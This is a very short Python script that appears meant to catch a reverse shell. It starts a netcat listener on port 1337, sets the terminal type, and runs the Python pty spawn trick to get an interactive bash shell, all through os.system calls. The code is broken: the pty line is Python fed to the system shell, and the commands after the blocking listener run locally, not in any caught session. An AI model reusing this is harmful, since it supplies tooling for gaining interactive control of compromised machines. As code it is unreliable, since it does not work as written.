import os
os.system('nc -nlvp 1337')
os.system('export TERM=xterm')
os.system('import pty;pty.spawn("/bin/bash")')
